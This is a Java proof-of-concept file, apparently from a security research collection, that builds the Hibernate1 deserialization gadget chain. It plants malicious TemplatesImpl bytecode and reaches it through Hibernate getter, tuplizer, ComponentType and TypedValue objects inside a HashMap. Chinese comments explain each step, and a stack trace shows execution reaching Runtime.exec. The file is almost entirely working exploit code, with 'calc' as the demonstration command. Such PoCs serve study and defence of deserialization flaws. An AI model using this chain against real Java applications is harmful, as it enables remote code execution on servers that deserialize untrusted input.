package com.javasec.pocs.hibernate;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.type.Type;
import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.HashMap;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * get:169, BasicPropertyAccessor$BasicGetter (org.hibernate.property)
 * getPropertyValue:76, AbstractComponentTuplizer (org.hibernate.tuple.component)
 * getPropertyValue:414, ComponentType (org.hibernate.type)
 * getHashCode:242, ComponentType (org.hibernate.type)
 * initialize:98, TypedValue$1 (org.hibernate.engine.spi)
 * initialize:95, TypedValue$1 (org.hibernate.engine.spi)
 * getValue:72, ValueHolder (org.hibernate.internal.util)
 * hashCode:73, TypedValue (org.hibernate.engine.spi)
 * hash:338, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:64, SerializeUtils (com.javasec.utils)
 * deserTester:309, SerializeUtils (com.javasec.utils)
 * main:64, hibernate1 (com.javasec.pocs.hibernate)
 */
public class hibernate1 {
    public static void main(String[] args) throws Exception {
        Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");


        // 生成包含恶意类字节码的 TemplatesImpl 类
        Templates tmpl = SerializeUtils.getTemplate("calc");
        Method  method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            getter=SerializeUtils.newInstance("org.hibernate.property.access.spi.GetterMethodImpl",null,null,method);

        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            getter=SerializeUtils.newInstance("org.hibernate.property.BasicPropertyAccessor$BasicGetter",new Class[]{Class.class,Method.class,String.class},tmpl.getClass(),method,"outputProperties");
        }

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        Object tuplizer = SerializeUtils.createWithoutConstructor(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = SerializeUtils.createWithoutConstructor(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        SerializeUtils.setFieldValue(type,"componentTuplizer",tuplizer);
        SerializeUtils.setFieldValue(type,"propertySpan",1);
        SerializeUtils.setFieldValue(type,"propertyTypes",new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "su18");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        SerializeUtils.setFieldValue(typedValue,"value",tmpl);
        SerializeUtils.deserTester(hashMap);
    }
}
